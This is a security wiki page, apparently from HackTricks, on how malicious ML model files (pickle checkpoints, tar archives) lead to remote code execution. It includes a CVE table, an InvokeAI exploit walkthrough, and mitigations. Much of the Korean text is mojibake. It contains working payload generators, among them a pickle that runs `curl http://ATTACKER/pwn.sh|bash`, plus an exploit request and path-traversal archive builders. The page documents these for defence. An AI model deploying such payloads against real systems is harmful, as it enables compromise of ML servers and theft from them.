# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Loading models to RCE

Machine Learning models are usually shared in different formats, such as ONNX, TensorFlow, PyTorch, etc. These models can be loaded into developers machines or production systems to use them. Usually the models sholdn't contain malicious code, but there are some cases where the model can be used to execute arbitrary code on the system as intended feature or because of a vulnerability in the model loading library.

At the time of the writting these are some examples of this type of vulneravilities:

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | ëª¨ë¸ ì²´í¬í¬ì¸íŠ¸ì˜ ì•…ì„± pickleì´ ì½”ë“œ ì‹¤í–‰ìœ¼ë¡œ ì´ì–´ì§ (`weights_only` ë³´í˜¸ ìš°íšŒ)                                                        | |
| PyTorch **TorchServe**      | *ShellTorch* â€“ **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + ì•…ì„± ëª¨ë¸ ë‹¤ìš´ë¡œë“œë¡œ ì½”ë“œ ì‹¤í–‰ ë°œìƒ; ê´€ë¦¬ APIì—ì„œì˜ Java deserialization RCE                                                     | |
| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization via `torch.load` **(CVE-2025-23298)**                                           | ì‹ ë¢°í•  ìˆ˜ ì—†ëŠ” ì²´í¬í¬ì¸íŠ¸ê°€ `load_model_trainer_states_from_checkpoint` ë™ì•ˆ pickle reducerë¥¼ íŠ¸ë¦¬ê±° â†’ ML ì›Œì»¤ì—ì„œ ì½”ë“œ ì‹¤í–‰           | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | YAMLì—ì„œ ëª¨ë¸ ë¡œë”© ì‹œ `yaml.unsafe_load` ì‚¬ìš©(ì½”ë“œ ì‹¤í–‰) <br> Lambda ë ˆì´ì–´ë¡œ ëª¨ë¸ ë¡œë”© ì‹œ ì„ì˜ì˜ Python ì½”ë“œ ì‹¤í–‰                       | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | ì¡°ì‘ëœ `.tflite` ëª¨ë¸ì´ ì •ìˆ˜ ì˜¤ë²„í”Œë¡œìš°ë¥¼ ìœ ë°œ â†’ í™ ì†ìƒ(ì ì¬ì  RCE)                                                                  | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | `joblib.load`ë¡œ ëª¨ë¸ì„ ë¡œë”©í•˜ë©´ ê³µê²©ìì˜ `__reduce__` í˜ì´ë¡œë“œê°€ í¬í•¨ëœ pickleì´ ì‹¤í–‰ë¨                                               | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load`ì˜ ê¸°ë³¸ê°’ì´ í”¼í´ëœ ê°ì²´ ë°°ì—´ì„ í—ˆìš© â€“ ì•…ì„± `.npy/.npz`ê°€ ì½”ë“œ ì‹¤í–‰ì„ ìœ ë°œ                                                  | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX ëª¨ë¸ì˜ external-weights ê²½ë¡œê°€ ë””ë ‰í„°ë¦¬ë¥¼ ë²—ì–´ë‚˜ ì„ì˜ íŒŒì¼ì„ ì½ì„ ìˆ˜ ìˆìŒ <br> ì•…ì„± ONNX ëª¨ë¸ tarì´ ì„ì˜ íŒŒì¼ì„ ë®ì–´ì¨ (RCEë¡œ ì´ì–´ì§ˆ ìˆ˜ ìˆìŒ) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | custom operatorê°€ ìˆëŠ” ëª¨ë¸ì€ ê³µê²©ìì˜ ë„¤ì´í‹°ë¸Œ ì½”ë“œë¥¼ ë¡œë“œí•´ì•¼ í•  ìˆ˜ ìˆìŒ; ë³µì¡í•œ ëª¨ë¸ ê·¸ë˜í”„ê°€ ë¡œì§ì„ ì•…ìš©í•´ ì˜ë„í•˜ì§€ ì•Šì€ ê³„ì‚°ì„ ì‹¤í–‰í•  ìˆ˜ ìˆìŒ | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | `--model-control`ì´ í™œì„±í™”ëœ ìƒíƒœì—ì„œ model-load APIë¥¼ ì‚¬ìš©í•˜ë©´ ìƒëŒ€ ê²½ë¡œ íŠ¸ë˜ë²„ì„¤ë¡œ íŒŒì¼ì„ ì“°ëŠ” ê²ƒì´ ê°€ëŠ¥(ì˜ˆ: `.bashrc` ë®ì–´ì“°ê¸°ë¡œ RCE) | |
| **GGML (GGUF format)**      | **CVE-2024-25664 â€¦ 25668** (multiple heap overflows)                                                                         | ì†ìƒëœ GGUF ëª¨ë¸ íŒŒì¼ì´ íŒŒì„œì—ì„œ í™ ë²„í¼ ì˜¤ë²„í”Œë¡œìš°ë¥¼ ìœ ë°œí•˜ì—¬ í”¼í•´ ì‹œìŠ¤í…œì—ì„œ ì„ì˜ ì½”ë“œ ì‹¤í–‰ì„ ê°€ëŠ¥í•˜ê²Œ í•¨                           | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | ì•…ì„± HDF5 (`.h5`) ëª¨ë¸ì— í¬í•¨ëœ Lambda ë ˆì´ì–´ ì½”ë“œê°€ ë¡œë“œ ì‹œ ì—¬ì „íˆ ì‹¤í–‰ë¨ (Keras safe_modeê°€ êµ¬í˜• í¬ë§·ì„ ì»¤ë²„í•˜ì§€ ì•ŠìŒ â€“ â€œdowngrade attackâ€) | |
| **Others** (general)        | *Design flaw* â€“ Pickle serialization                                                                                         | ë§ì€ ML ë„êµ¬ë“¤(ì˜ˆ: pickle ê¸°ë°˜ ëª¨ë¸ í¬ë§·, Python `pickle.load`)ì€ ì™„í™”ë˜ì§€ ì•Šìœ¼ë©´ ëª¨ë¸ íŒŒì¼ì— í¬í•¨ëœ ì„ì˜ ì½”ë“œë¥¼ ì‹¤í–‰í•¨                    | |

Moreover, there some python pickle based models like the ones used by [PyTorch](https://github.com/pytorch/pytorch/security) that can be used to execute arbitrary code on the system if they are not loaded with `weights_only=True`. So, any pickle based model might be specially susceptible to this type of attacks, even if they are not listed in the table above.

### ğŸ†•  InvokeAIì˜ `torch.load`ë¥¼ í†µí•œ RCE (CVE-2024-12029)

`InvokeAI` is a popular open-source web interface for Stable-Diffusion. Versions **5.3.1 â€“ 5.4.2** expose the REST endpoint `/api/v2/models/install` that lets users download and load models from arbitrary URLs.

Internally the endpoint eventually calls:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
When the supplied file is a **PyTorch checkpoint (`*.ckpt`)**, `torch.load` performs a **pickle deserialization**.  Because the content comes directly from the user-controlled URL, an attacker can embed a malicious object with a custom `__reduce__` method inside the checkpoint; the method is executed **during deserialization**, leading to **remote code execution (RCE)** on the InvokeAI server.

ì´ ì·¨ì•½ì ì€ **CVE-2024-12029**ë¡œ ì§€ì •ë˜ì—ˆìŠµë‹ˆë‹¤ (CVSS 9.8, EPSS 61.17 %).

#### Exploitation walk-through

1. ì•…ì„± checkpoint ìƒì„±:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. ì œì–´í•˜ëŠ” HTTP ì„œë²„ì— `payload.ckpt`ë¥¼ í˜¸ìŠ¤íŒ…í•˜ì„¸ìš” (ì˜ˆ: `http://ATTACKER/payload.ckpt`).
3. ì·¨ì•½í•œ ì—”ë“œí¬ì¸íŠ¸ë¥¼ í˜¸ì¶œí•˜ì„¸ìš” (ì¸ì¦ ë¶ˆí•„ìš”):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false â†’ no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. InvokeAIê°€ íŒŒì¼ì„ ë‹¤ìš´ë¡œë“œí•˜ë©´ `torch.load()`ë¥¼ í˜¸ì¶œí•˜ê³  â†’ `os.system` gadgetì´ ì‹¤í–‰ë˜ì–´ ê³µê²©ìê°€ InvokeAI í”„ë¡œì„¸ìŠ¤ ì»¨í…ìŠ¤íŠ¸ì—ì„œ ì½”ë“œ ì‹¤í–‰ì„ íšë“í•©ë‹ˆë‹¤.

Ready-made exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029`ì´ ì „ì²´ íë¦„ì„ ìë™í™”í•©ë‹ˆë‹¤.

#### ì¡°ê±´

â€¢  InvokeAI 5.3.1-5.4.2 (scan flag default **false**)  
â€¢  ê³µê²©ìê°€ `/api/v2/models/install`ì— ì ‘ê·¼ ê°€ëŠ¥  
â€¢  í”„ë¡œì„¸ìŠ¤ì— ì…¸ ëª…ë ¹ì„ ì‹¤í–‰í•  ê¶Œí•œ ë³´ìœ 

#### ì™„í™” ì¡°ì¹˜

* **InvokeAI â‰¥ 5.4.3**ë¡œ ì—…ê·¸ë ˆì´ë“œ â€“ íŒ¨ì¹˜ì—ì„œ ê¸°ë³¸ì ìœ¼ë¡œ `scan=True`ë¡œ ì„¤ì •í•˜ê³  ì—­ì§ë ¬í™” ì „ì— ì•…ì„± ì†Œí”„íŠ¸ì›¨ì–´ ìŠ¤ìº”ì„ ìˆ˜í–‰í•©ë‹ˆë‹¤.  
* ì²´í¬í¬ì¸íŠ¸ë¥¼ í”„ë¡œê·¸ë˜ë°ì ìœ¼ë¡œ ë¡œë“œí•  ë•ŒëŠ” `torch.load(file, weights_only=True)` ë˜ëŠ” ìƒˆë¡œìš´ [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) í—¬í¼ë¥¼ ì‚¬ìš©í•˜ì„¸ìš”.  
* ëª¨ë¸ ì†ŒìŠ¤ì— ëŒ€í•´ allow-lists / signaturesë¥¼ ì ìš©í•˜ê³  ì„œë¹„ìŠ¤ë¥¼ ìµœì†Œ ê¶Œí•œìœ¼ë¡œ ì‹¤í–‰í•˜ì„¸ìš”.

> âš ï¸ ê¸°ì–µí•˜ì„¸ìš”: **ëª¨ë“ ** Python pickle ê¸°ë°˜ í˜•ì‹(ë§ì€ `.pt`, `.pkl`, `.ckpt`, `.pth` íŒŒì¼ í¬í•¨)ì€ ì‹ ë¢°í•  ìˆ˜ ì—†ëŠ” ì†ŒìŠ¤ì—ì„œ ì—­ì§ë ¬í™”í•˜ëŠ” ê²ƒì´ ë³¸ì§ˆì ìœ¼ë¡œ ì•ˆì „í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.

---

êµ¬ì‹ InvokeAI ë²„ì „ì„ ë¦¬ë²„ìŠ¤ í”„ë¡ì‹œ ë’¤ì—ì„œ ê³„ì† ìš´ì˜í•´ì•¼ í•˜ëŠ” ê²½ìš°ì˜ ì„ì‹œ ì™„í™” ì˜ˆ:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### ğŸ†• NVIDIA Merlin Transformers4Recì˜ ì•ˆì „í•˜ì§€ ì•Šì€ `torch.load`ì„ í†µí•œ RCE (CVE-2025-23298)

NVIDIAì˜ Transformers4Rec(Merlinì˜ ì¼ë¶€)ëŠ” ì‚¬ìš©ì ì œê³µ ê²½ë¡œì— ëŒ€í•´ ì§ì ‘ `torch.load()`ì„ í˜¸ì¶œí•˜ëŠ” ì•ˆì „í•˜ì§€ ì•Šì€ checkpoint loaderë¥¼ ë…¸ì¶œí–ˆìŠµë‹ˆë‹¤. `torch.load`ê°€ Python `pickle`ì— ì˜ì¡´í•˜ê¸° ë•Œë¬¸ì—, attacker-controlled checkpointëŠ” ì—­ì§ë ¬í™”(deserialization) ì¤‘ reducerë¥¼ í†µí•´ ì„ì˜ì˜ ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

Vulnerable path (pre-fix): `transformers4rec/torch/trainer/trainer.py` â†’ `load_model_trainer_states_from_checkpoint(...)` â†’ `torch.load(...)`.

ì™œ ì´ê²ƒì´ RCEë¡œ ì´ì–´ì§€ëŠ”ê°€: Python `pickle`ì—ì„œ, ê°ì²´ëŠ” í˜¸ì¶œ ê°€ëŠ¥í•œ ê°ì²´ì™€ ì¸ìˆ˜ë¥¼ ë°˜í™˜í•˜ëŠ” reducer (`__reduce__`/`__setstate__`)ë¥¼ ì •ì˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë°˜í™˜ëœ callableì€ unpickling ê³¼ì •ì—ì„œ ì‹¤í–‰ë©ë‹ˆë‹¤. ì´ëŸ¬í•œ ê°ì²´ê°€ checkpointì— í¬í•¨ë˜ì–´ ìˆìœ¼ë©´, ê°€ì¤‘ì¹˜ê°€ ì‚¬ìš©ë˜ê¸° ì „ì— ì‹¤í–‰ë©ë‹ˆë‹¤.

ìµœì†Œ ì•…ì„± checkpoint ì˜ˆ:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
ì „ë‹¬ ë²¡í„° ë° ì˜í–¥ ë²”ìœ„:
- Trojanized checkpoints/modelsê°€ repos, buckets, ë˜ëŠ” artifact registriesë¥¼ í†µí•´ ê³µìœ ë¨
- ì²´í¬í¬ì¸íŠ¸ë¥¼ ìë™ìœ¼ë¡œ ë¡œë“œí•˜ëŠ” ìë™ resume/deploy íŒŒì´í”„ë¼ì¸
- ì‹¤í–‰ì€ training/inference workers ë‚´ë¶€ì—ì„œ ë°œìƒí•˜ë©°, ì¢…ì¢… ê¶Œí•œ ìƒìŠ¹(ì˜ˆ: root in containers) ìƒíƒœì„

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802)ëŠ” ì§ì ‘ì ì¸ `torch.load()` í˜¸ì¶œì„ `transformers4rec/utils/serialization.py`ì— êµ¬í˜„ëœ ì œí•œëœ, allow-listed deserializerë¡œ êµì²´í–ˆìŠµë‹ˆë‹¤. ìƒˆ ë¡œë”ëŠ” íƒ€ì…/í•„ë“œë¥¼ ê²€ì¦í•˜ê³  ë¡œë“œ ì¤‘ ì„ì˜ì˜ callableì´ í˜¸ì¶œë˜ëŠ” ê²ƒì„ ë°©ì§€í•©ë‹ˆë‹¤.

PyTorch checkpointsì— ëŒ€í•œ ë°©ì–´ ì§€ì¹¨:
- ì‹ ë¢°í•  ìˆ˜ ì—†ëŠ” ë°ì´í„°ë¥¼ unpickleí•˜ì§€ ë§ˆì„¸ìš”. ê°€ëŠ¥í•œ ê²½ìš° [Safetensors](https://huggingface.co/docs/safetensors/index) ë˜ëŠ” ONNX ê°™ì€ non-executable í¬ë§·ì„ ì„ í˜¸í•˜ì„¸ìš”.
- PyTorch serializationì„ ì‚¬ìš©í•´ì•¼ í•˜ëŠ” ê²½ìš° `weights_only=True`(ì‹ ê·œ PyTorchì—ì„œ ì§€ì›)ë¥¼ ì‚¬ìš©í•˜ê±°ë‚˜ Transformers4Rec íŒ¨ì¹˜ì™€ ìœ ì‚¬í•œ ì»¤ìŠ¤í…€ allow-listed unpicklerë¥¼ ì‚¬ìš©í•˜ì„¸ìš”.
- ëª¨ë¸ ì¶œì²˜/ì„œëª…(provenance/signatures)ì„ ê°•ì œí•˜ê³  ì—­ì§ë ¬í™”ëŠ” ìƒŒë“œë°•ìŠ¤í™”( seccomp/AppArmor; non-root user; ì œí•œëœ FS ë° ë„¤íŠ¸ì›Œí¬ egress ì°¨ë‹¨)í•˜ì„¸ìš”.
- ì²´í¬í¬ì¸íŠ¸ ë¡œë“œ ì‹œ ML ì„œë¹„ìŠ¤ì—ì„œ ì˜ˆìƒì¹˜ ëª»í•œ ìì‹ í”„ë¡œì„¸ìŠ¤ê°€ ìƒì„±ë˜ëŠ”ì§€ ëª¨ë‹ˆí„°ë§í•˜ê³ , `torch.load()`/`pickle` ì‚¬ìš©ì„ ì¶”ì í•˜ì„¸ìš”.

POC ë° ì·¨ì•½ì /íŒ¨ì¹˜ ì°¸ì¡°:
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## ì˜ˆì œ â€“ ì•…ì„± PyTorch ëª¨ë¸ ì œì‘

- ëª¨ë¸ ìƒì„±:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- ëª¨ë¸ ë¶ˆëŸ¬ì˜¤ê¸°:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# âš ï¸ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
## ëª¨ë¸ì„ ì´ìš©í•œ Path Traversal

As commented in [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), ëŒ€ë¶€ë¶„ì˜ AI í”„ë ˆì„ì›Œí¬ì—ì„œ ì‚¬ìš©ë˜ëŠ” ëª¨ë¸ í¬ë§·ì€ ë³´í†µ `.zip` ê°™ì€ ì•„ì¹´ì´ë¸Œ ê¸°ë°˜ì…ë‹ˆë‹¤. ë”°ë¼ì„œ ì´ëŸ¬í•œ í¬ë§·ì„ ì•…ìš©í•´ path traversal attacksë¥¼ ìˆ˜í–‰í•˜ì—¬ ëª¨ë¸ì´ ë¡œë“œë˜ëŠ” ì‹œìŠ¤í…œì—ì„œ ì„ì˜ì˜ íŒŒì¼ì„ ì½ì„ ìˆ˜ ìˆì„ ê°€ëŠ¥ì„±ì´ ìˆìŠµë‹ˆë‹¤.

For example, with the following code you can create a model that will create a file in the `/tmp` directory when loaded:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
ë˜ëŠ” ë‹¤ìŒ ì½”ë“œë¥¼ ì‚¬ìš©í•˜ë©´ ë¡œë“œë  ë•Œ `/tmp` ë””ë ‰í† ë¦¬ì— symlinkë¥¼ ìƒì„±í•˜ëŠ” ëª¨ë¸ì„ ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### ì‹¬ì¸µ ë¶„ì„: Keras .keras deserialization and gadget hunting

.keras ë‚´ë¶€ êµ¬ì¡°, Lambda-layer RCE, â‰¤ 3.8ì—ì„œì˜ the arbitrary import issue, ê·¸ë¦¬ê³  allowlist ë‚´ë¶€ì˜ post-fix gadget discoveryì— ëŒ€í•œ ì§‘ì¤‘ ê°€ì´ë“œëŠ” ë‹¤ìŒì„ ì°¸ì¡°í•˜ì„¸ìš”:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## ì°¸ê³ ìë£Œ

- [OffSec blog â€“ "CVE-2024-12029 â€“ InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch â€“ security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog â€“ CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)

{{#include ../banners/hacktricks-training.md}}
